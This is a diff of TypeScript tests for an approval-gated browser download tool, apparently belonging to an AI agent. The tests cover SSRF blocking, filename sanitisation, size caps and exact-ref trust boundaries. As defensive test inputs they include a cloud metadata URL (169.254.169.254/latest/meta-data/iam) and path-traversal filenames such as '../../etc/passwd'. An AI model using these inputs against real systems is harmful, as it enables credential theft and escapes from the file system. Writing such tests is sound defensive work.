+      // SOURCE, not the page.
+      url: () => "http://169.254.169.254/latest/meta-data/iam",
+      suggestedFilename: () => "meta.txt",
+      saveAs: async (p: string) => {
+        saved++;
+        writeFileSync(p, "x");
+      },
+      cancel: async () => {
+        cancelled++;
+      }
+    };
+    installDownloadSession("dl-ssrf", download);
+
+    const raw = await browserDownloadApproved("dl-ssrf", "@e2", "dl-ssrf-inst");
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toContain("download source URL");
+    expect(cancelled).toBe(1);
+    expect(saved).toBe(0);
+    expect(existsSync(downloadsDirFor("dl-ssrf-inst"))).toBe(false);
+  });
+
+  test("saves a client-generated blob: download without gating its source", async () => {
+    // A blob: URL is the page exporting bytes it already holds (the
+    // common "export CSV" anchor) — no network fetch happens, so the
+    // SSRF/domain gate must not cancel it.
+    let cancelled = 0;
+    const download = {
+      url: () => "blob:https://portal.example.com/3f0a8a44-1c2e-4f0b-9d52-aaaa00001111",
+      suggestedFilename: () => "export.csv",
+      saveAs: async (p: string) => writeFileSync(p, "a,b\n1,2"),
+      cancel: async () => {
+        cancelled++;
+      }
+    };
+    installDownloadSession("dl-blob", download);
+
+    const raw = await browserDownloadApproved("dl-blob", "@e2", "dl-blob-inst");
+    const parsed = JSON.parse(raw) as { success: boolean; path?: string; downloadUrl?: string };
+    expect(parsed.success).toBe(true);
+    expect(cancelled).toBe(0);
+    expect(parsed.path).toBe(join(downloadsDirFor("dl-blob-inst"), "export.csv"));
+    expect(parsed.downloadUrl).toBe("blob:https://portal.example.com/3f0a8a44-1c2e-4f0b-9d52-aaaa00001111");
+    expect(existsSync(parsed.path!)).toBe(true);
+  });
+
+  test("sanitizes a traversal-laden suggested filename down to its basename", async () => {
+    const download = {
+      suggestedFilename: () => "../../../etc/evil.sh",
+      saveAs: async (p: string) => writeFileSync(p, "x")
+    };
+    installDownloadSession("dl-traversal", download);
+
+    const raw = await browserDownloadApproved("dl-traversal", "@e2", "dl-traversal-inst");
+    const parsed = JSON.parse(raw) as { success: boolean; path?: string };
+    expect(parsed.success).toBe(true);
+    // Saved INSIDE the downloads dir under the stripped basename — the
+    // traversal segments must not escape the directory.
+    expect(parsed.path).toBe(join(downloadsDirFor("dl-traversal-inst"), "evil.sh"));
+  });
+
+  test("unique-ifies the save path when the filename already exists", async () => {
+    const dir = downloadsDirFor("dl-collide-inst");
+    mkdirSync(dir, { recursive: true });
+    writeFileSync(join(dir, "report.pdf"), "earlier");
+    const download = {
+      suggestedFilename: () => "report.pdf",
+      saveAs: async (p: string) => writeFileSync(p, "newer")
+    };
+    installDownloadSession("dl-collide", download);
+
+    const raw = await browserDownloadApproved("dl-collide", "@e2", "dl-collide-inst");
+    const parsed = JSON.parse(raw) as { success: boolean; path?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.path).toBe(join(dir, "report-1.pdf"));
+    // The earlier file is untouched.
+    expect(existsSync(join(dir, "report.pdf"))).toBe(true);
+  });
+
+  test("rejects and deletes a download over the size cap", async () => {
+    browserTest.setDownloadMaxBytesForTest(4);
+    const download = {
+      suggestedFilename: () => "huge.bin",
+      saveAs: async (p: string) => writeFileSync(p, "way more than four bytes")
+    };
+    installDownloadSession("dl-cap", download);
+
+    const raw = await browserDownloadApproved("dl-cap", "@e2", "dl-cap-inst");
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toMatch(/size cap/);
+    expect(existsSync(join(downloadsDirFor("dl-cap-inst"), "huge.bin"))).toBe(false);
+  });
+
+  test("fails loudly on an unknown ref without self-healing", async () => {
+    // The page exposes getByRole/getByText (the healing surface) — the
+    // approved-download path must NOT consult them. Trust boundary: the
+    // approval named the exact stamped element (see ADR
+    // browser-fill-secret.md).
+    let healingQueried = 0;
+    const fakePage = {
+      ...makeFakePageForRefTools("https://portal.example.com/invoices"),
+      waitForEvent: (() => new Promise(() => undefined)) as unknown as import("playwright-core").Page["waitForEvent"],
+      getByRole: () => {
+        healingQueried++;
+        return { nth: () => ({ count: async () => 1 }) };
+      },
+      getByText: () => {
+        healingQueried++;
+        return { nth: () => ({ count: async () => 1 }) };
+      }
+    } as unknown as Partial<import("playwright-core").Page>;
+    browserTest.installFakeSessionWithPageForTest("dl-bad-ref", fakePage);
+
+    const raw = await browserDownloadApproved("dl-bad-ref", "@e99", "dl-bad-ref-inst");
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toContain("Unknown ref @e99");
+    expect(healingQueried).toBe(0);
+  });
+
+  test("fails with a browser_navigate steer when the click never triggers a download", async () => {
+    // Inline-rendering links (Chrome opens PDFs in its viewer) never fire
+    // the download event, so the wait times out. The failure must tell
+    // the model to reach inline content via browser_navigate instead.
+    browserTest.setDownloadEventTimeoutForTest(25);
+    let clicks = 0;
+    const fakePage = {
+      ...makeFakePageForRefTools("https://portal.example.com/invoices"),
+      // Honors the injected timeout: rejects like Playwright's
+      // TimeoutError when no download event arrives in time.
+      waitForEvent: ((_event: string, opts?: { timeout?: number }) =>
+        new Promise((_, reject) =>
+          setTimeout(
+            () => reject(new Error(`Timeout ${opts?.timeout}ms exceeded while waiting for event "download"`)),
+            opts?.timeout ?? 0
+          )
+        )) as unknown as import("playwright-core").Page["waitForEvent"]
+    };
+    browserTest.installFakeSessionWithPageForTest("dl-timeout", fakePage);
+    const refs = new Map<string, unknown>();
+    refs.set("@e2", {
+      click: async () => {
+        clicks++;
+      }
+    });
+    browserTest.setFakeSessionRefsForTest("dl-timeout", refs);
+
+    const raw = await browserDownloadApproved("dl-timeout", "@e2", "dl-timeout-inst");
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(clicks).toBe(1);
+    expect(parsed.error).toContain("did not trigger a file download");
+    expect(parsed.error).toContain("browser_navigate");
+  });
+
+  test("surfaces a click failure as the tool error", async () => {
+    const download = {
+      suggestedFilename: () => "never.pdf",
+      saveAs: async () => undefined
+    };
+    installDownloadSession("dl-click-fail", download, { clickThrows: true });
+
+    const raw = await browserDownloadApproved("dl-click-fail", "@e2", "dl-click-fail-inst");
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toContain("click failed");
+  });
+});
+
+describe("sanitizeDownloadFilename", () => {
+  test("keeps a plain filename", () => {
+    expect(sanitizeDownloadFilename("invoice.pdf")).toBe("invoice.pdf");
+  });
+
+  test("strips directories and traversal (slash and backslash)", () => {
+    expect(sanitizeDownloadFilename("../../etc/passwd")).toBe("passwd");
+    expect(sanitizeDownloadFilename("..\\..\\evil.exe")).toBe("evil.exe");
+  });
+
+  test("falls back to 'download' for empty and dot-only names", () => {
+    expect(sanitizeDownloadFilename("")).toBe("download");
+    expect(sanitizeDownloadFilename(".")).toBe("download");
+    expect(sanitizeDownloadFilename("..")).toBe("download");
+    expect(sanitizeDownloadFilename("a/b/")).toBe("download");
+  });
+
+  test("removes control characters", () => {
+    expect(sanitizeDownloadFilename("re\x00port\x1f.pdf")).toBe("report.pdf");
   });
 });
 
